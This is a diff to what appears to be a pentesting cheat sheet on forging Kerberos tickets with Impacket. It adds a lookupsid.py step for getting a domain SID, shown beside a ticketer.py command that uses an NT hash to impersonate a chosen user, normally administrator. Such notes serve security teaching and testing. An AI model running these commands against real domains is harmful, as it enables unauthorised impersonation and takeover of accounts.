@@ -9,6 +9,10 @@ Ingredients:
 - Impacket suite in your attacker machine (by default in kali / parrot, or just  install it for any other linux distro)
 - User to impersonate (any user you want to get, normally administrator. You just need the name)
 
+Get domain SID (in case you don't have it already):
+
+`lookupsid.py <domain>/<user>:<password>@<ip>` (tipical impacket usage)
+
 Create your ticket:
 
 `ticketer.py -nthash <nthash> -domain-sid <domain sid> -domain <domain> <user to impersonate>`
